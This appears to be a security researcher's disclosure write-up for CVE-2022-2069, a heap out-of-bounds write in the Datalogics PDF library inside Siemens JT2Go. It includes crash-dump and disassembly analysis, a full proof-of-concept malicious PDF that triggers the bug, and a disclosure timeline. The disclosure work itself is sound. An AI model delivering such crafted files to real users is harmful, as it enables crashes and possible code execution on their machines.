---
layout: post
title:  "CVE-2022-2069 - Datalogics File Parsing Vulnerability in Teamcenter Visualization and JT2Go"
date:   2022-08-17 10:00:00 +0800
tags:
    - CVE-2022-2069
    - SSA-829738
---

Overview
-----------
JT2Go has been unanimously embraced by industry leaders as the premier free viewing tool for JT data. By providing a comprehensive Desktop application and mobile platform solutions on iOS and Android, Siemens has made viewing of JT data available for everyone in nearly any situation. Exact product that was found to be vulnerable including complete version information was Siemens PLM Software JT2Go 13.3.0.20211108.01. Siemens Teamcenter Visualization and JT2Go are affected by an out of bounds write vulnerability in APDFL library from Datalogics. If a user is tricked to open a malicious PDF file with the affected products, this could lead the application to crash or potentially lead to arbitrary code execution.

Root Cause Analysis
-------------------
An exploitable out-of-bounds heap write vulnerability exists due to an error in the DL180pdfl!PDNameTreeLookup function when handling a maliciously crafted PDF file. A remote attacker may be able to exploit this to execute arbitrary code within the context of the application, via a crafted PDF file. A specially crafted PDF document can trigger an out-of-bounds write, which can disclose sensitive memory content or even write and aid in exploitation when coupled with another vulnerability. An attacker needs to trick the user to open the malicious file to trigger this vulnerability. 

An access violation happened when JT2Go tries to open specially crafted PDF file. If we look at the crash path, it appears r9 is containing an out-of-bounds memory region and it was accessed. The analysis performed on DL180pdf.dll that triggers the vulnerability.
```
(5b8.6cc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
DL180pdfl!PDNameTreeLookup+0x785e8a:
00007fff`1d0dd0d0 41897904        mov     dword ptr [r9+4],edi ds:00000257`ff441000=????????

0:000> .exr -1
ExceptionAddress: 00007fff1d0dd0d0 (DL180pdfl!PDNameTreeLookup+0x0000000000785e8a)
ExceptionCode: c0000005 (Access violation)
ExceptionFlags: 00000000
NumberParameters: 2
 Parameter[0]: 0000000000000001
 Parameter[1]: 00000257ff441000
Attempt to write to address 00000257ff441000
```

Looking at the crash path, we know that the r9 is containing OOB memory region:
```
.text:00000001807AD0D0 loc_1807AD0D0:                     
.text:00000001807AD0D0                 mov     [r9+4], edi    ; crash here
.text:00000001807AD0D4                 mov     [r9], edi
.text:00000001807AD0D7                 mov     [r8+4], edi
.text:00000001807AD0DB                 mov     [r8], edi
.text:00000001807AD0DE                 movzx   r13d, [rbp+57h+var_CE]
.text:00000001807AD0E3                 xor     r13b, 1
.text:00000001807AD0E7                 mov     [rbp+57h+var_CE], r13b
```

The pointer was assigned by ASmalloc():
```
; v20 = *(&v58 + v4);
.text:00000001807ACF50 loc_1807ACF50:               
.text:00000001807ACF50                 mov     esi, 0FFFFFFFFh
.text:00000001807ACF55                 mov     r14d, r12d
.text:00000001807ACF58                 movzx   edx, r12w
.text:00000001807ACF5C                 mov     [rbp+57h+var_D0], dx
.text:00000001807ACF60                 xor     r12b, r12b
.text:00000001807ACF63                 mov     [rbp+57h+arg_18], r12b
.text:00000001807ACF67                 movzx   eax, r13b
.text:00000001807ACF6B                 mov     r8, qword ptr [rbp+rax*8+57h+var_80]
.text:00000001807ACF70                 mov     r9, qword ptr [rbp+rax*8+57h+var_68]       ; r9 was assigned with the point to [rbp+rax*8+57h+var_68]
.text:00000001807ACF75                 mov     [r9], esi
.text:00000001807ACF78                 mov     [r8], esi
.text:00000001807ACF7B                 add     r8, 4
.text:00000001807ACF7F                 mov     [rbp+57h+var_B8], r8
.text:00000001807ACF83                 add     r9, 4
```

This code where it is responsible to assigned the size:
```
; v7 = 4i64 * (*a2 + 4);
.text:00000001807ACE8F                 mov     ebx, eax
.text:00000001807ACE91                 shl     rbx, 2
  
; v11 = ASmalloc(v7);
; *&v58 = v11;
.text:00000001807ACEE6                 mov     ecx, edi
.text:00000001807ACEE8                 call    ASmalloc
.text:00000001807ACEED                 mov     rbx, rax
.text:00000001807ACEF0                 mov     qword ptr [rbp+57h+var_68], rax
```

The r9 register add up with 4 which change the size of the heap with extra 4 bytes:
```
; v22 = v20 + 1;
.text:00000001807ACF83                 add     r9, 4
.text:00000001807ACF87                 mov     [rbp+57h+var_C8], r9
```

However when EDI tries to access r9, it appears it tries to access to a pointer that contains out-of-bounds memory region which triggers heap corruption when it writes to OOB memory.
```
.text:00000001807AD0D0                 mov     [r9+4], edi    ; crash due to heap corruption
.text:00000001807AD0D4                 mov     [r9], edi
.text:00000001807AD0D7                 mov     [r8+4], edi
```

Proof-of-Concept related to the PDF that cause the issue:
```
%PDF-1.4
1 0 obj
<< /Type /Catalog
/Outlines 2 0 R
/Pages 3 0 R
>>
endobj

2 0 obj
<< /Count 0
/Type /Outlines
>>
endobj

3 0 obj
<< /Count 1
/Kids [8 0 R]
/Type /Pages
>>
endobj

4 0 obj
<< /Length 103
>>
stream
���������\������\ö €üYYYYYPPPPPPPPPPPPPPPPPPPPPPPPPPPpPPPPPPPPPS³:>0¨ÿ+1lV?~~èa"xvi´–„#ÿ¬
endstream
endobj

5 0 obj
<< /DecodeParms  << /JBIG2Globals 4 0 R >>
/Width 32
/ColorSpace /DeviceGray
/Height 32
/Filter /JBIG2Decode
/Subtype /Image
/Length 76
/Type /XObject
/BitsPerComponent 1
>>
stream
���0������� ��� ���G���G������"����"��� ��� ��������������žèTìßë	N“ÿ¬
endstream
endobj

6 0 obj
<< /Length 42
>>
stream
q 32.000000 0 0 32.000000 0 0 cm /Im1 Do Q
endstream
endobj

7 0 obj
<< /XObject << /Im1 5 0 R >>
/ProcSet [/PDF /ImageB]
>>
endobj

8 0 obj
<< /Parent 3 0 R
/Type /Page
/Contents 6 0 R
/Resources 7 0 R
/MediaB‚x [ 0 0 32.000000 32.000000 ]
>>
endobj

xref
0 9
0000000000 65535 f 
0000000009 00000 n 
0000000075 00000 n 
0000000122 00000 n 
0000000180 00000 n 
0000000269 00000 n 
0000000553 00000 n 
0000000646 00000 n ¡0000000718 00000 n 

trailer
<< /Size 9
/Root 1 0 R >>
startxref
837
%%EOF
```

Disclosure timeline
-------------------
The vulnerability was reported back in March 2022. Timeline of disclosure:
- [March 9, 2022] Sending the proof-of-concept and the analysis to productcert@siemens.com
- [March 9, 2022] Siemens CERT team acknowledge teh submission and track the submission with ID S-PCERT#50343
- [March 22, 2022] Request for an update to Siemens CERT
- [March 22, 2022] Siemens CERT replying said that they still perform an analysis
- [April 13, 2022] Request for an update to Siemens CERT
- [April 13, 2022] Siemens CERT confirm the issue submitted is valid and they're able to reproduced the issue. They observed the issue resides on DL180pdf library which is a 3rd party library belongs to Datalogics. CERT asked for my detail to be put in their advisory and CVE will be assign.
- [June 21, 2022] Request for an update to Siemens CERT
- [June 21, 2022] Siemens CERT plan to publish an advisory on July 12th and has assigned CVE-2022-2069. 
- [July 12, 2022] Siemens CERT sending an email regarding the advisory on https://cert-portal.siemens.com/productcert/html/ssa-829738.html
- [March 9, 2022]






